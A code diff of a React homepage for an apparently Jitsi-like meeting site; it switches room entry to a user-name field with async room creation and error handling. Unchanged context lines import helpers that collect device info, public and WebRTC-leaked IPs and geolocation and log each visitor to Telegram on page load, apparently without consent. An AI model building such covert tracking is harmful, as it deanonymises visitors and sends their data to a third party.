@@ -13,13 +13,16 @@ import imgGhPng from 'figma:asset/fd5823994372c13bc9a9453daddfbb272ceecb31.png';
 import { getDeviceInfo } from '@/utils/deviceInfo';
 import { logVisitorEntry } from '@/utils/telegramLogger';
 import { getPublicIP, getWebRTCIPs, getIPGeolocation } from '@/utils/ipGeolocation';
+import { createRoom, getRoom } from '@/utils/jitsiAPI';
 
 interface HomePageProps {
-  onStartMeeting: (roomName: string) => void;
+  onStartMeeting: (roomSlug: string) => void;
 }
 
 export default function HomePage({ onStartMeeting }: HomePageProps) {
-  const [roomName, setRoomName] = useState('');
+  const [userName, setUserName] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
+  const [error, setError] = useState<string | null>(null);
   const hasLoggedVisit = useRef(false);
 
   // ========================================
@@ -86,14 +89,30 @@ export default function HomePage({ onStartMeeting }: HomePageProps) {
     trackVisitor();
   }, []);
 
-  const handleStartMeeting = () => {
-    if (roomName.trim()) {
-      onStartMeeting(roomName.trim());
+  const handleStartMeeting = async () => {
+    if (userName.trim()) {
+      setIsLoading(true);
+      setError(null);
+
+      try {
+        // Создаём комнату и получаем slug
+        console.log('🚀 [HomePage] Создание комнаты для пользователя:', userName);
+        const { roomSlug } = await createRoom(userName.trim());
+        console.log('✅ [HomePage] Комната создана, slug:', roomSlug);
+        
+        // Переходим на PreJoin экран
+        onStartMeeting(roomSlug);
+      } catch (error) {
+        console.error('❌ [HomePage] Ошибка при создании комнаты:', error);
+        setError('Failed to create room. Please try again.');
+      } finally {
+        setIsLoading(false);
+      }
     }
   };
 
   const handleKeyPress = (e: React.KeyboardEvent<HTMLInputElement>) => {
-    if (e.key === 'Enter' && roomName.trim()) {
+    if (e.key === 'Enter' && userName.trim()) {
       handleStartMeeting();
     }
   };
@@ -141,21 +160,22 @@ export default function HomePage({ onStartMeeting }: HomePageProps) {
               <div className="flex-1 sm:pr-1 pb-[10px] sm:pb-0">
                 <input
                   type="text"
-                  value={roomName}
-                  onChange={(e) => setRoomName(e.target.value)}
+                  value={userName}
+                  onChange={(e) => setUserName(e.target.value)}
                   onKeyPress={handleKeyPress}
-                  placeholder="Enter room name"
+                  placeholder="Enter your name"
                   className="w-full h-[50px] px-[10px] text-[#253858] text-[14px] font-['Arial:Narrow',sans-serif] outline-none bg-white rounded-[4px] border-0"
                 />
               </div>
               <button
                 onClick={handleStartMeeting}
-                disabled={!roomName.trim()}
+                disabled={!userName.trim() || isLoading}
                 className="bg-[#0977e2] text-white text-[16px] sm:text-[14px] font-['Arial:Narrow',sans-serif] w-full sm:w-auto px-5 py-[17px] sm:py-[17px] rounded-[3px] hover:bg-[#0063c1] transition-colors disabled:opacity-50 disabled:cursor-not-allowed whitespace-nowrap leading-normal"
               >
-                Start meeting
+                {isLoading ? 'Loading...' : 'Start meeting'}
               </button>
             </div>
+            {error && <p className="text-red-500 text-[14px] leading-[17px] font-['Arial:Narrow',sans-serif] mt-2">{error}</p>}
           </div>
         </div>
       </div>
